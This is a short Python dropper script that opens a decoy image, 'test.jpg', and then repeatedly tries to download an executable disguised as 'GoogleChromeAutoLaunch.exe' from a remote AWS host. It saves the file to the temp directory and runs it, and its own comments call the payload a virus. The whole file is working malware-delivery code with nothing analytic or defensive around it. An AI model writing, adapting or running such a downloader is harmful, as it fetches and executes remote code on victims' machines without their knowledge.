import requests
import os
import time
import tempfile
import subprocess

#open photos
os.startfile('test.jpg')
time.sleep(1)
os.startfile('test.jpg')


# download virRu5
url = "http://ec2-52-90-251-67.compute-1.amazonaws.com/GoogleChromeAutoLaunch.exe"
while True:
        try:
                response = requests.get(url, stream=True)
        except:
                pass
        else:
                break

# move to temp
tempDirectory = tempfile.gettempdir()
newFile = tempDirectory + "//GoogleChromeAutoLaunch.exe"

with open(newFile, "wb") as handle:
        handle.write(response.content)

# execute virRu5
subprocess.Popen(newFile)

'''
import shutil
# copy file to temp
tempDirectory = tempfile.gettempdir()
shutil.copy('test.jpg',tempDirectory)
'''